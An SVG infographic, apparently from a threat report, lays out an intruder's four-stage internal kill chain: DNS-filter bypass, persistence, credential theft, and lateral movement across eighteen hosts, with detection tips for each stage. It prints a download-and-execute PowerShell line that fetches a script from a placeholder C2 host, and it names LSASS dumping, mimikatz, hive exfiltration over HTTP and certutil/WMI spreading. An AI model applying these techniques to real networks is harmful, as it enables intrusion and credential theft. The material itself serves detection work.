<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 1640" font-family="-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#cccccc"/>
    </marker>
    <filter id="cardShadow" x="-2%" y="-2%" width="104%" height="108%">
      <feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/>
    </filter>
  </defs>

  <rect width="1000" height="1640" fill="#161616"/>
  <rect x="0.5" y="0.5" width="999" height="1639" fill="none" stroke="#2a2a2a" stroke-width="1"/>

  <text x="500" y="62" text-anchor="middle" font-size="40" font-weight="700" fill="#ffffff">The Internal Kill Chain</text>
  <text x="500" y="106" text-anchor="middle" font-size="24" fill="#f5f5f5">What the operator did once they had a foothold</text>
  <text x="500" y="140" text-anchor="middle" font-size="18" fill="#cccccc">Every stage is scripted, not improvised, and reuses one domain backdoor account</text>
  <line x1="60" y1="166" x2="940" y2="166" stroke="#2a2a2a" stroke-width="1"/>

  <!-- STEP 1 - orange -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="196" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="196" width="880" height="46" rx="8" fill="#f97316"/>
    <rect x="60" y="229" width="880" height="13" fill="#f97316"/>
    <text x="80" y="227" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STAGE 1</text>
    <text x="220" y="227" font-size="23" font-weight="600" fill="#111111">Study the Environment, Bypass the DNS Filter</text>
    <text x="80" y="282" font-size="21" fill="#ffffff">Three scripts recon, then drive the appliance through its own admin API</text>
    <text x="80" y="316" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">jaction=getWhitelist, addwhitelist via the policy page's JSON API</text>
    <text x="80" y="350" font-size="18" fill="#e5e5e5">A planted AD DNS A record makes the operator's own name resolve inward</text>
    <text x="80" y="384" font-size="18" fill="#fb923c" font-weight="600">Detect: Add-DnsServerResourceRecordA planting an unfamiliar name</text>
  </g>
  <line x1="500" y1="416" x2="500" y2="456" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- STEP 2 - yellow -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="462" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="462" width="880" height="46" rx="8" fill="#eab308"/>
    <rect x="60" y="495" width="880" height="13" fill="#eab308"/>
    <text x="80" y="493" font-size="17" font-weight="700" fill="#111111" letter-spacing="0.5">STAGE 2</text>
    <text x="220" y="493" font-size="23" font-weight="600" fill="#111111">Six Persistence Mechanisms, One Fileless Re-Pull</text>
    <text x="80" y="548" font-size="21" fill="#ffffff">Scheduled tasks forge their Author field and run hidden as SYSTEM</text>
    <text x="80" y="582" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">DownloadString('http://&lt;C2&gt;:42718/task_39.ps1') via iex</text>
    <text x="80" y="616" font-size="18" fill="#e5e5e5">Weekly re-pull, so removing the payload without the task removes nothing</text>
    <text x="80" y="650" font-size="18" fill="#fb923c" font-weight="600">Detect: a scheduled task whose action is a DownloadString one-liner</text>
  </g>
  <line x1="500" y1="682" x2="500" y2="722" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- STEP 3 - red -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="728" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="728" width="880" height="46" rx="8" fill="#dc2626"/>
    <rect x="60" y="761" width="880" height="13" fill="#dc2626"/>
    <text x="80" y="759" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STAGE 3</text>
    <text x="220" y="759" font-size="23" font-weight="600" fill="#ffffff">Domain Admin, Then Three Routes to Credentials</text>
    <text x="80" y="814" font-size="21" fill="#ffffff">A new account is created and added straight to Domain Admins by script</text>
    <text x="80" y="848" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">LSASS minidump · mimikatz · SAM/SYSTEM/SECURITY hives PUT over HTTP</text>
    <text x="80" y="882" font-size="18" fill="#e5e5e5">EnableLUA and NLA are both disabled, widening the host's own exposure</text>
    <text x="80" y="916" font-size="18" fill="#fb923c" font-weight="600">Detect: a handle opened on lsass.exe followed by a large Temp write</text>
  </g>
  <line x1="500" y1="948" x2="500" y2="988" stroke="#cccccc" stroke-width="2" marker-end="url(#arrow)"/>

  <!-- STEP 4 - deep red -->
  <g filter="url(#cardShadow)">
    <rect x="60" y="994" width="880" height="220" rx="8" fill="#1a1a1a" stroke="#2a2a2a" stroke-width="1"/>
    <rect x="60" y="994" width="880" height="46" rx="8" fill="#7f1d1d"/>
    <rect x="60" y="1027" width="880" height="13" fill="#7f1d1d"/>
    <text x="80" y="1025" font-size="17" font-weight="700" fill="#ffffff" letter-spacing="0.5">STAGE 4</text>
    <text x="220" y="1025" font-size="23" font-weight="600" fill="#ffffff">Mass Deployment Across an Eighteen-Host Fleet</text>
    <text x="80" y="1080" font-size="21" fill="#ffffff">Seven scripts reuse the same domain backdoor over net use to reach every host</text>
    <text x="80" y="1114" font-size="17" fill="#e5e5e5" font-family="ui-monospace, 'Cascadia Mono', Menlo, monospace">certutil, xcopy, WMI process create, all falling back to the next on failure</text>
    <text x="80" y="1148" font-size="18" fill="#fb923c" font-weight="600">Detect: wmic /node invoking certutil against an admin share</text>
    <text x="80" y="1180" font-size="18" fill="#fb923c" font-weight="600">One blocked transfer path does not stop the deployment</text>
  </g>

  <line x1="60" y1="1260" x2="940" y2="1260" stroke="#2a2a2a" stroke-width="1"/>
  <text x="500" y="1294" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">Detection anchors: DownloadString scheduled task, lsass.exe handle plus Temp write</text>
  <text x="500" y="1324" text-anchor="middle" font-size="18" font-weight="600" fill="#ffffff">wmic /node certutil against an admin share</text>
  <text x="500" y="1360" text-anchor="middle" font-size="15" fill="#cccccc">Staged capability throughout, proven by the operator's own scripts, not confirmed as executed on every host</text>
  <text x="500" y="1392" text-anchor="middle" font-size="14" fill="#888888">Legend: orange = environment study · yellow = persistence · red = credential access · deep red = lateral movement</text>
</svg>
